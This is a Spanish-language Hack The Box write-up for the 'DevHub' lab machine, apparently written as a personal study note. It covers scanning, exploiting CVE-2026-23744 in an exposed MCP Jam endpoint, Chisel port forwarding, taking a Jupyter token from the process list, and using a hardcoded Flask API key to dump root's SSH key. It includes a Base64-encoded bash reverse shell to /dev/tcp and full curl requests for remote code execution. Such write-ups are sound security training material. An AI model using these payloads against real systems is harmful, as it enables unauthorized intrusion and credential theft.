---
created: 2026-7-20
description: DevHub es una máquina Linux que expone una instancia de MCP Jam vulnerable a CVE-2026-23744, lo que permite la ejecución remota de código sin autenticación a través del endpoint /api/mcp/connect. El acceso inicial implica usar Chisel para acceder a un servicio interno de Jupyter y recuperar su token de autenticación desde la lista de procesos para obtener acceso como analyst. La escalada de privilegios se consigue explotando un servidor MCP basado en Flask con una clave API hardcodeada para recuperar la clave privada SSH de root.
---

#htb #medium #linux #web #mcp #mcp-jam #cve-2026-23744 #api #rce #port-forwarding #chisel #jupyter #process-enumeration #secret-leak #flask #api-key-leak #ssh-keys

# Enumeración
## Escaneo de puertos

```bash
[hvidal@fedora] ~/d/h/h/m/d/scan
❯ nmap -p- --open -vvv --min-rate 5000 -n 10.129.55.181 -oG scan
Discovered open port 80/tcp on 10.129.55.181
Discovered open port 22/tcp on 10.129.55.181
Discovered open port 6274/tcp on 10.129.55.181
```

Puertos abiertos: 22,80,6274

```bash
[hvidal@fedora] ~/d/h/h/m/d/scan
❯ nmap -p 22,80,6274 -sCV 10.129.55.181 -oN portscan.txt -Pn
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devhub.htb/
6274/tcp open  unknown
| GetRequest: 
|___HTTP/1.1 200 OK
```

```bash
[hvidal@fedora] ~/d/h/h/m/f/scan
❯ echo "10.129.55.181 devhub.htb" | sudo tee -a /etc/hosts	
```

## MCP Jam

`devhub.htb:6274` ejecuta una aplicación **MCP Jam**. Este servicio tiene una vulnerabilidad conocida ([CVE-2026-23744](https://github.com/MCPJam/inspector/security/advisories/GHSA-232v-j27c-5pp6)).
Vamos a comprobar si es vulnerable.

La vulnerabilidad se produce porque el servidor escucha en `0.0.0.0` (todas las interfaces), exponiendo todos los endpoints.
Por lo tanto, si la aplicación es vulnerable, el endpoint `/api/mcp/connect` debe ser accesible de forma remota.
```ts
const server = serve({
  fetch: app.fetch,
  port: SERVER_PORT,
  hostname: "0.0.0.0",
});
```

```bash
[hvidal@fedora] ~/d/h/h/m/d/scan
❯ curl -X POST http://devhub.htb:6274/api/mcp/connect
{"success":false,"error":"Failed to parse request body","details":"Unexpected end of JSON input"}
```
El endpoint es accesible, por lo que la aplicación es vulnerable.

# Explotación

## MCP Jam

El endpoint `/api/mcp/connect` permite que los **LLMs** lancen y se comuniquen con distintos programas cuando es necesario.
El problema reside en cómo se implementa esta funcionalidad. Al no haber restricciones sobre los comandos y al estar el endpoint expuesto sin validar la entrada del usuario, cualquiera puede controlar qué proceso se ejecuta en el servidor, lo que da lugar a Remote Code Execution (RCE).

Codificar una reverse shell de bash en **Base64**.
```bash
[hvidal@fedora] ~/d/h/h/m/d/scan
❯ echo "bash -i >& /dev/tcp/IP/4444 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xMjAvNDQ0NCAwPiYxCg==
```

Iniciar un listener.
```bash
[hvidal@fedora] ~/d/h/h/m/d/scan
❯ nc -lnvp 4444
```

Enviar una petición POST al endpoint `/api/mcp/connect` con la reverse shell codificada en Base64.
```bash
[hvidal@fedora] ~/d/h/h/m/d/scan
❯ curl -X POST http://devhub.htb:6274/api/mcp/connect \ 
      --header "Content-Type: application/json" \
      -d '{ 
    "serverConfig" :  { 
      "command" :  "/bin/bash" , 
      "args" :  [ "-c", "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xMjAvNDQ0NCAwPiYxCg== | base64 -d | bash" ] , 
      "env" :  { } 
    } , 
    "serverId" :  "test" 
  }'
```

# Movimiento lateral

`devhub.htb` revela que hay una aplicación ejecutándose en `localhost:8888`.
Utilizar [[chisel|chisel]] para reenviar el servicio a la máquina del atacante.

## Port forwarding

Copiar el binario de **chisel** a la máquina víctima.
- Atacante.
```bash
[hvidal@fedora] ~/d/h/h/port_forwarding
❯ python -m http.server 8080
```
- Víctima.
```bash
mcp-dev@devhub:/tmp$ wget IP:8080/chisel
mcp-dev@devhub:/tmp$ chmod +x chisel
```

Reenviar el puerto a nuestra máquina.
- Atacante.
```bash
[hvidal@fedora] ~/d/h/h/port_forwarding
❯ ./chisel server --reverse -p 1234
2026/07/18 22:58:59 server: Listening on http://0.0.0.0:1234
```
- Víctima.
```bash
mcp-dev@devhub:/tmp$ ./chisel client IP:1234 R:8888:127.0.0.1:8888 &
```

Ahora la aplicación se muestra en `localhost:8888` en nuestra máquina.

## Jupyter

Identificar el usuario que ejecuta el servicio **Jupyter**.
```bash
mcp-dev@devhub:/tmp$ ps aux | grep jupyter
analyst python3 jupyter-lab --notebook-dir=/home/analyst/notebooks --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7

root /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```

El proceso `jupyter-lab` pertenece a `analyst`.
Dado que el token de autenticación se pasa como argumento en la línea de comandos, es visible en la lista de procesos.

Ahora hay que iniciar sesión en la aplicación **Jupyter** y seleccionar el terminal para obtener una terminal interactiva como el usuario `analyst`.

Leer la flag de usuario.
```bash
analyst@devhub:~$ cat user.txt
```

#  Escalada de privilegios

## Enumeración

El comando `ps aux | grep jupyter` mostró que root está ejecutando `/opt/opsmcp/server.py`. Veamos sus permisos.
```bash
analyst@devhub:~$ ls -l /opt/opsmcp/server.py
-rw-r----- 1 analyst analyst 6021 Mar 16 21:49 /opt/opsmcp/server.py
```

Revisar el código del script.
```bash
analyst@devhub:~$ cat /opt/opsmcp/server.py
```

El script levanta una aplicación **Flask** en el puerto 5000.
El código fuente contiene una clave API hardcodeada.
```python
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"
```

El endpoint `/tools/call` expone múltiples herramientas a través de una única API. Al especificar `ops._admin_dump` como nombre de la herramienta y `ssh_keys` como objetivo, la aplicación devuelve la clave privada SSH de root.

## Explotación

Enviar una petición POST a `/tools/call`, especificando `ops._admin_dump` como nombre de la herramienta y `ssh_keys` como argumento de destino.
```bash
analyst@devhub:~$ curl -X POST 127.0.0.1:5000/tools/call \
	-H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
	-H "Content-Type: application/json" \
	-d '{
	"name": "ops._admin_dump", 
	"arguments": { 
		"confirm": true, 
		"target": "ssh_keys" 
	}}'
	
{"note":"Emergency recovery key dump","root_private_key":"-----BEGIN OPENSSH PRIVATE KEY----- .... -----END OPENSSH PRIVATE KEY-----","target":"ssh_keys"}
```

Guardar la clave privada localmente.
```bash
[hvidal@fedora] ~/d/h/h/m/d/content
❯ echo -e "-----BEGIN OPENSSH PRIVATE KEY-----\n .... \nOPENSSH PRIVATE KEY-----" > id_rsa
```

Establecer los permisos correctos.
```bash
[hvidal@fedora] ~/d/h/h/m/d/content
❯ chmod 600 id_rsa
```

Iniciar sesión como root.
```bash
[hvidal@fedora] ~/d/h/h/m/d/content
❯ ssh -i id_rsa root@devhub.htb
```

Leer la flag de root.
```bash
root@devhub:~$ cat /root/root.txt
```